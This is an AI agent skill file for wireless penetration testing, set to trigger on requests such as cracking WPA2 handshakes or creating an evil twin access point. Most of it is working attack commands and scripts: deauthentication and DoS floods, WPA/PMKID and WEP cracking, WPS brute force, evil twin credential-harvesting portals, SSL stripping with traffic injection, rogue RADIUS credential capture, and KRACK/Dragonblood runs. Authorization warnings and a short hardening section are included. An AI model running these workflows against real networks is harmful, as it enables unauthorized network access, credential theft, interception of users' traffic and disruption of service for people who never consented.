---
name: wireless-security-wifi-penetration-testing
description: Hands-on wireless security and WiFi penetration testing using aircrack-ng, hostapd, and related tools for 802.11 assessment
triggers:
  - "how do I crack WPA2 handshake"
  - "setup monitor mode on wireless adapter"
  - "capture WiFi handshake with airodump"
  - "deauth attack with aireplay-ng"
  - "create evil twin access point"
  - "crack WEP encryption with aircrack"
  - "setup rogue AP with hostapd"
  - "wireless penetration testing workflow"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides expertise in wireless security assessment and WiFi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 network reconnaissance, WEP/WPA/WPA2/WPA3 attacks, rogue access points, wireless MITM, and enterprise WPA assessment.

## Overview

The Wireless Security & WiFi Penetration Testing project is a comprehensive study guide covering:

- **802.11 fundamentals**: Standards, frame types, encryption protocols
- **Adapter configuration**: Monitor mode, packet injection setup
- **Reconnaissance**: Network discovery, traffic analysis, hidden SSID enumeration
- **WEP attacks**: Statistical cracking, Chop-Chop, fragmentation, Caffe Latte
- **WPA/WPA2 attacks**: Handshake capture, PMKID extraction, dictionary and GPU cracking
- **WPA3 attacks**: Dragonblood, downgrade attacks
- **Rogue AP attacks**: Evil twin, captive portals, wireless MITM
- **Enterprise assessment**: EAP/RADIUS testing, 802.1X exploitation

## Prerequisites

**Hardware Requirements:**
- Injection-capable wireless adapter (Atheros AR9271 or Ralink RT3070/RT5372)
- Test access point you own
- Client device for testing

**Software Requirements:**
- Kali Linux (or equivalent with wireless tools)
- aircrack-ng suite
- hashcat for GPU cracking
- hostapd, dnsmasq for rogue AP
- wireshark, kismet for analysis

**Legal Warning:**
```bash
# ⚠️  AUTHORIZATION REQUIRED
# Only test networks you own or have explicit written permission to assess.
# Unauthorized wireless attacks are illegal in most jurisdictions.
```

## Installation & Setup

### Install Core Tools (Kali Linux)

```bash
# Update package lists
sudo apt update

# Install aircrack-ng suite
sudo apt install aircrack-ng -y

# Install additional wireless tools
sudo apt install hostapd dnsmasq wireshark kismet -y

# Install WPA cracking tools
sudo apt install hashcat hcxtools hcxdumptool -y

# Install WPS attack tools
sudo apt install reaver bully -y

# Install rogue AP frameworks
sudo apt install wifiphisher -y
pip3 install wifipumpkin3
```

### Verify Wireless Adapter

```bash
# List wireless interfaces
iwconfig

# Check adapter chipset
lsusb | grep -i wireless

# Verify driver support
airmon-ng

# Expected output shows your wireless interface (e.g., wlan0)
```

### Enable Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor mode (interface becomes wlan0mon)
iwconfig

# Test packet injection capability
sudo aireplay-ng --test wlan0mon

# Expected: Injection is working! with packet counts
```

## Core Wireless Reconnaissance

### Network Discovery

```bash
# Scan all channels for access points and clients
sudo airodump-ng wlan0mon

# Scan specific channel (e.g., channel 6)
sudo airodump-ng -c 6 wlan0mon

# Scan 5GHz band
sudo airodump-ng --band a wlan0mon

# Write captured data to file
sudo airodump-ng -w capture --output-format pcap wlan0mon
```

### Target-Specific Capture

```bash
# Focus on specific BSSID (AP MAC) and channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon

# Monitor specific ESSID (network name)
sudo airodump-ng --essid "TargetNetwork" wlan0mon

# Capture only handshakes (WPA/WPA2)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
```

### Hidden SSID Discovery

```bash
# Capture beacons and probe responses
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# In another terminal, deauth a client to force probe request
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Hidden SSID will appear when client reconnects
```

## WPA/WPA2 Handshake Capture & Cracking

### Capture WPA Handshake

```bash
# Terminal 1: Start capture on target AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Terminal 2: Deauthenticate client to force handshake
# -0 = deauth attack, 10 = number of deauth packets
# -a = AP BSSID, -c = client MAC
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Watch airodump output for "WPA handshake: AA:BB:CC:DD:EE:FF"
```

### Crack WPA/WPA2 Handshake with Aircrack-ng

```bash
# Crack using wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# Crack with multiple CPU threads
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF -t 4 wpa_capture-01.cap

# Example successful output:
# KEY FOUND! [ password123 ]
```

### GPU Cracking with Hashcat

```bash
# Convert capture to hashcat format
sudo aircrack-ng wpa_capture-01.cap -J wpa_hash

# Or use hcxpcaptool for newer formats
hcxpcaptool -z wpa_hash.hc22000 wpa_capture-01.cap

# Crack with hashcat (WPA-EAPOL-PBKDF2 mode 22000)
hashcat -m 22000 -a 0 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt

# Crack with GPU acceleration and rules
hashcat -m 22000 -a 0 -w 3 wpa_hash.hc22000 wordlist.txt -r rules/best64.rule

# Show cracked passwords
hashcat -m 22000 wpa_hash.hc22000 --show
```

### PMKID Attack (Clientless WPA/WPA2)

```bash
# Capture PMKID (no client or deauth needed)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcaptool -z pmkid.hc22000 pmkid_capture.pcapng

# Crack PMKID
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# PMKID attacks work against vulnerable routers that cache PMKID
```

## WEP Cracking

### WEP Attack with ARP Replay

```bash
# Terminal 1: Capture on target WEP network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Terminal 2: Fake authentication
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Terminal 3: ARP replay attack to generate IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Wait for ~40,000 IVs (data packets), then crack
sudo aircrack-ng wep_capture-01.cap

# WEP key will be recovered (e.g., 1A:2B:3C:4D:5E)
```

### WEP Chop-Chop Attack

```bash
# Fake authentication
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Chop-Chop attack to decrypt a packet
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon

# Use decrypted packet for ARP replay
sudo aireplay-ng -2 -r replay_dec-0000.cap wlan0mon

# Crack when enough IVs collected
sudo aircrack-ng wep_capture-01.cap
```

## Deauthentication & DoS Attacks

### Targeted Deauth Attack

```bash
# Deauth specific client from AP
# -0 = deauth mode, 0 = continuous (or number of packets)
# -a = AP BSSID, -c = client MAC
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Deauth all clients from AP (broadcast deauth)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Send specific number of deauth packets
sudo aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Denial of Service

```bash
# Channel hopping DoS (MDK3 or MDK4)
sudo mdk4 wlan0mon d -c 6

# Beacon flood
sudo mdk4 wlan0mon b -c 6

# Authentication DoS
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -m
```

## Rogue Access Point (Evil Twin)

### Basic Rogue AP with Hostapd

```bash
# Create hostapd configuration
cat > hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start rogue AP
sudo hostapd hostapd.conf
```

### Evil Twin with Internet Bridge

```bash
# Setup IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure DHCP server (dnsmasq)
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Assign IP to rogue AP interface
sudo ip addr add 192.168.10.1/24 dev wlan0

# Start DHCP server
sudo dnsmasq -C dnsmasq.conf -d

# Setup NAT for internet access
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Start hostapd
sudo hostapd hostapd.conf
```

### Evil Twin Attack Workflow

```bash
# 1. Identify target AP
sudo airodump-ng wlan0mon

# 2. Deauth clients from legitimate AP (continuous)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon &

# 3. Create evil twin with same ESSID on different channel
# (use hostapd.conf with target ESSID)

# 4. Capture credentials via fake captive portal
# Use wifiphisher or wifipumpkin3 for automated evil twin
sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetNetwork"
```

### Automated Evil Twin with Wifiphisher

```bash
# Auto evil twin with credential harvesting
sudo wifiphisher -aI wlan0 -jI wlan1 -e "CoffeeShop WiFi"

# Evil twin with firmware upgrade page
sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade

# Evil twin with OAuth login page
sudo wifiphisher -aI wlan0 -jI wlan1 -p oauth-login
```

## Wireless MITM

### Capture Traffic with Bettercap

```bash
# Start bettercap on rogue AP interface
sudo bettercap -iface wlan0

# In bettercap console:
# Enable HTTP/HTTPS proxy
> set http.proxy.sslstrip true
> set http.proxy.script /path/to/inject.js
> http.proxy on

# Enable DNS spoofing
> set dns.spoof.domains example.com
> dns.spoof on

# Sniff credentials
> net.sniff on
> set net.sniff.verbose true
> set net.sniff.local true

# View captured data
> net.show
```

### SSL Strip Attack

```bash
# Use mitmproxy for SSL stripping
mitmproxy --mode transparent --showhost

# Configure iptables to redirect traffic
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Victims' HTTPS traffic will be downgraded to HTTP where possible
```

## WPS Attacks

### WPS PIN Brute Force with Reaver

```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Attack WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Attack with advanced options
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 2 -T 0.5 -c 6

# Options:
# -d = delay between attempts
# -T = timeout per pin attempt
# -c = channel
```

### WPS Pixie Dust Attack

```bash
# Faster WPS attack exploiting weak randomization
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K

# Or use bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d
```

## Enterprise WPA (EAP/RADIUS) Assessment

### Capture Enterprise Handshakes

```bash
# Capture EAP handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise_capture wlan0mon

# Look for EAPOL frames with EAP identity
tshark -r enterprise_capture-01.cap -Y "eap"
```

### Rogue RADIUS Server Attack

```bash
# Setup fake RADIUS server with FreeRADIUS
# Edit /etc/freeradius/3.0/clients.conf
cat >> /etc/freeradius/3.0/clients.conf << 'EOF'
client rogue-ap {
    ipaddr = 192.168.1.1
    secret = testing123
}
EOF

# Setup hostapd for enterprise AP
cat > hostapd_eap.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorpNetwork
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
auth_algs=3
ieee8021x=1
eapol_version=2
own_ip_addr=192.168.1.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
EOF

# Start FreeRADIUS
sudo freeradius -X

# Start rogue enterprise AP
sudo hostapd hostapd_eap.conf
```

### EAP Credential Capture

```bash
# Use hostapd-wpe (Wireless Pwnage Edition) for credential harvesting
sudo hostapd-wpe hostapd_eap.conf

# Captured credentials appear in hostapd-wpe log:
# username: john.doe
# challenge: ...
# response: ...
# Crack with asleap or hashcat
```

## Traffic Analysis

### Wireshark 802.11 Analysis

```bash
# Open capture in Wireshark
wireshark wpa_capture-01.cap

# Apply 802.11 filters:
# wlan.fc.type_subtype == 0x08  # Beacon frames
# wlan.fc.type_subtype == 0x0b  # Authentication
# wlan.fc.type_subtype == 0x00  # Association request
# eapol                          # WPA handshake frames
# wlan.da == AA:BB:CC:DD:EE:FF   # Destination MAC

# Decrypt WPA traffic with known PSK:
# Edit → Preferences → Protocols → IEEE 802.11
# Add decryption key: wpa-pwd:password:SSID
```

### Extract Data from Capture

```bash
# Extract WPA handshake from cap file
tshark -r capture.cap -Y "eapol" -w handshake.cap

# Export objects (HTTP, files) from decrypted capture
tshark -r capture.cap --export-objects http,extracted_files/

# List all SSIDs in capture
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid | sort -u

# Extract MAC addresses
tshark -r capture.cap -T fields -e wlan.sa | sort -u  # Source
tshark -r capture.cap -T fields -e wlan.da | sort -u  # Destination
```

## Advanced Attacks

### KRACK Attack (Key Reinstallation)

```bash
# Clone KRACK attack scripts
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# Install dependencies
./krackattack/install.sh

# Run KRACK test against target client
./krackattack/attack.py wlan0mon wlan1 "TargetNetwork" -t 11:22:33:44:55:66

# Monitor for successful key reinstallation
```

### WPA3 Dragonblood Attack

```bash
# Clone Dragonblood tools
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test WPA3 AP for vulnerabilities
./dragonslayer/test-sae-pk.py wlan0mon -b AA:BB:CC:DD:EE:FF -e "WPA3Network"

# Downgrade WPA3 to WPA2 (if AP supports both)
# Setup rogue AP advertising only WPA2
```

## Wireless Hardening & Defense

### Detection Techniques

```bash
# Monitor for rogue APs with Kismet
sudo kismet -c wlan0mon

# Detect deauth attacks (spike in deauth frames)
sudo airodump-ng wlan0mon --write rogue_check --output-format pcap

# Analyze for anomalies
tshark -r rogue_check-01.cap -Y "wlan.fc.type_subtype == 0x0c" | wc -l

# High deauth count indicates DoS attack
```

### Mitigation Best Practices

```bash
# Enable 802.11w (Management Frame Protection) on AP
# In hostapd.conf:
# ieee80211w=2  # Require MFP
# This prevents deauth/disassoc attacks

# Use strong WPA2/WPA3 passwords
# Minimum 20 characters, avoid dictionary words

# Disable WPS on production APs

# Implement WIDS (Wireless Intrusion Detection System)
# Use tools like Kismet, WIPS appliances

# MAC filtering (weak but adds layer)
# macaddr_acl=1
# accept_mac_file=/etc/hostapd/accept.mac

# Hidden SSID (security through obscurity, not recommended alone)
# ignore_broadcast_ssid=1
```

## Common Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Manually set monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Check interface mode
iw dev wlan0 info

# If fails, check driver support
lsmod | grep -i wireless
```

### Injection Not Working

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# If injection fails:
# 1. Verify chipset compatibility (AR9271, RT3070)
lsusb

# 2. Check adapter isn't in power save mode
sudo iw dev wlan0mon set power_save off

# 3. Try different channels
sudo iw dev wlan0mon set channel 6

# 4. Update firmware
sudo apt install firmware-atheros firmware-ralink
```

### No Handshake Captured

```bash
# Ensure client is connected to AP before deauth
# Check airodump for STATION column

# Increase deauth packet count
sudo aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Verify correct channel
# AP and capture must be on same channel

# Try targeted deauth (not broadcast)
# Use specific client MAC, not all clients

# Check capture file for EAPOL frames
tshark -r capture-01.cap -Y "eapol"
```

### Hostapd Fails to Start

```bash
# Check interface is not in use
sudo airmon-ng check kill

# Disable NetworkManager on interface
sudo nmcli dev set wlan0 managed no

# Verify interface is in correct mode
# hostapd needs interface NOT in monitor mode
sudo airmon-ng stop wlan0mon

# Check hostapd config syntax
sudo hostapd -d hostapd.conf

# Error messages will show config issues
```

### Cracking Takes Too Long

```bash
# Use GPU acceleration (hashcat)
hashcat -m 22000 -w 3 hash.hc22000 wordlist.txt

# Use larger wordlists
cat /usr/share/wordlists/rockyou.txt \
    /usr/share/wordlists/fasttrack.txt > combined.txt

# Apply rules for mutations
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Use precomputed rainbow tables (cowpatty)
genpmk -f wordlist.txt -d rainbow.db -s "SSID"
cowpatty -d rainbow.db -r capture-01.cap -s "SSID"

# Consider cloud cracking services (if authorized)
```

## Environment Variables

```bash
# Set regulatory domain (important for legal compliance)
export WIRELESS_REGDOM=US
sudo iw reg set US

# Path to wordlists
export WORDLIST_PATH=/usr/share/wordlists/rockyou.txt

# Hashcat working directory
export HASHCAT_WORKDIR=/tmp/hashcat

# Interface names
export MONITOR_IFACE=wlan0mon
export ATTACK_IFACE=wlan1
export TARGET_BSSID=AA:BB:CC:DD:EE:FF
export TARGET_CHANNEL=6
```

## Scripting Common Workflows

### Automated Handshake Capture Script

```bash
#!/bin/bash
# capture_handshake.sh

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
OUTPUT_PREFIX="$3"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL> <OUTPUT_PREFIX>"
    exit 1
fi

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Start capture
sudo airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
    -w "$OUTPUT_PREFIX" wlan0mon &
AIRODUMP_PID=$!

# Wait for clients to connect
sleep 10

# Send deauth packets
echo "Sending deauth packets..."
sudo aireplay-ng -0 5 -a "$TARGET_BSSID" wlan0mon

# Check for handshake every 5 seconds (max 60 seconds)
for i in {1..12}; do
    if grep -q "WPA handshake: $TARGET_BSSID" "${OUTPUT_PREFIX}-01.csv" 2>/dev/null; then
        echo "Handshake captured!"
        kill $AIRODUMP_PID
        exit 0
    fi
    sleep 5
done

echo "No handshake captured after 60 seconds"
kill $AIRODUMP_PID
exit 1
```

### Automated WPA Cracking Script

```bash
#!/bin/bash
# crack_wpa.sh

CAPTURE_FILE="$1"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"
TARGET_BSSID="$3"

if [ -z "$CAPTURE_FILE" ]; then
    echo "Usage: $0 <CAPTURE_FILE> [WORDLIST] [BSSID]"
    exit 1
fi

# Convert to hashcat format
hcxpcaptool -z hash.hc22000 "$CAPTURE_FILE"

if [ ! -f hash.hc22000 ]; then
    echo "No WPA handshakes found in capture"
    exit 1
fi

# Try hashcat first (GPU)
if command -v hashcat &> /dev/null; then
    echo "Attempting GPU cracking with hashcat..."
    hashcat -m 22000 -a 0 -w 3 hash.hc22000 "$WORDLIST" --show
    
    if [ $? -eq 0 ]; then
        exit 0
    fi
fi

# Fallback to aircrack-ng (CPU)
echo "Attempting CPU cracking with aircrack-ng..."
if [ -n "$TARGET_BSSID" ]; then
    sudo aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$CAPTURE_FILE"
else
    sudo aircrack-ng -w "$WORDLIST" "$CAPTURE_FILE"
fi
```

## Report Generation

### Document Findings

```bash
# Create markdown report
cat > wireless_pentest_report.md << 'EOF'
# Wireless Penetration Test Report

## Executive Summary
Target network was assessed for wireless security vulnerabilities.

## Scope
- ESSID: TargetNetwork
- BSSID: AA:BB:CC:DD:EE:FF
- Encryption: WPA2-PSK
- Channel: 6

## Findings

### High: Weak WPA2 Passphrase
**Description:** Network passphrase cracked in 15 minutes using dictionary attack.
**Evidence:** Captured 4-way handshake, cracked PSK: "password123"
**Impact:** Complete network compromise, unauthorized access, data interception.
**Recommendation:** Implement minimum 20-character passphrase policy.

### Medium: Deauthentication Attack Vulnerable
**Description:** Network susceptible to deauth DoS attacks.
**Evidence:** Successfully disconnected clients with aireplay-ng.
**Impact:** Denial of service, disruption to legitimate users.
**Recommendation:** Enable 802.11w Management Frame Protection.

### Low: SSID Broadcasting Enabled
**Description:** Network SSID broadcasted in beacon frames.
**Evidence:** SSID visible in airodump-ng scan.
**Impact:** Information disclosure, easier targeting.
**Recommendation:** Disable SSID broadcast (defense in depth only).

## Appendix
- Capture files: handshake-01.cap
- Tool output logs: aircrack_output.txt
EOF

echo "Report generated: wireless_pentest_report.md"
```

## Best Practices for AI Agents

1. **Always verify authorization**: Confirm user has written permission before running attacks
2. **Use test environments**: Recommend isolated lab setups with owned hardware
3. **Suggest legal alternatives**: Point to CTF platforms, HackTheBox, TryHackMe for practice
4. **Document findings**: Help generate professional reports with evidence and remediation
5. **Prioritize defense**: Pair every attack technique with its mitigation strategy
6. **Check tool installation**: Verify tools exist before suggesting commands
7. **Validate adapter compatibility**: Confirm injection-capable chipset before attack workflows
8. **Sanitize outputs**: Remove sensitive data (real BSSIDs, passwords) from examples
9. **Explain context**: Clarify what each command does and expected outcomes
10. **Provide troubleshooting**: Anticipate common failures and offer solutions

## Additional Resources

- **Official aircrack-ng documentation**: https://www.aircrack-ng.org/documentation.html
- **Hashcat wiki**: https://hashcat.net/wiki/
- **Kismet documentation**: https://www.kismetwireless.net/docs/
- **OSWP certification**: Offensive Security Wireless Professional
- **Wireless LAN Security Megaprimer**: SecurityTube (Vivek Ramachandran)

This skill focuses on practical, reproducible wireless security testing. All techniques should be used exclusively on authorized networks in controlled lab environments for education, research, and authorized security assessments.
